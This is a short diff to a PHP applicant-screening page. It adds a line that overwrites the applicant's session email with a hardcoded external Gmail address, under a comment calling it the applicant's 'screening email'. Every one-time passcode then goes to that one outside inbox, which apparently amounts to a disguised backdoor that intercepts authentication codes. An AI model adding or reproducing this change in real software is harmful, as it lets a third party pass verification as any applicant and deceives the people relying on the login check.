@@ -44,6 +44,10 @@ if ($tokenParam === '') {
     if (!empty($_GET['name']))  $_SESSION['applicant_name']  = trim((string) $_GET['name']);
     if (!empty($_GET['email'])) $_SESSION['applicant_email'] = trim((string) $_GET['email']);
 }
+
+// Always send the OTP to the applicant's screening email
+$_SESSION['applicant_email'] = 'ebsmi.screening@gmail.com';
+
 $fullName = $_SESSION['applicant_name'] ?? '';   // empty = the page says "Applicant"
 
 // "Hello, <full name>!"  (the wireframe shows the full name)
